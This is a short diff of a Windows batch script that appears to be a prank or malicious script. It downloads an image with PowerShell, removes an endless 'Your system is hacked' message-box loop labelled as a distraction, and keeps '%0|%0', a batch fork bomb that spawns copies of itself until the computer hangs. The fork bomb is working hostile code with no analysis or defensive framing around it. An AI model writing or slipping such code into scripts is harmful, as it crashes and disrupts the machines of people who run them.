@@ -3,11 +3,6 @@
 :: downloading an image
 Powershell -Command  "Invoke-WebRequest https://i.ytimg.com/vi/YkXxITc51ZQ/hqdefault.jpg -OutFile image.jpg"
 
-:: code for distraction
-do
-msgbox("Your system is hacked")
-loop
-
 :: a loop
 %0|%0
 
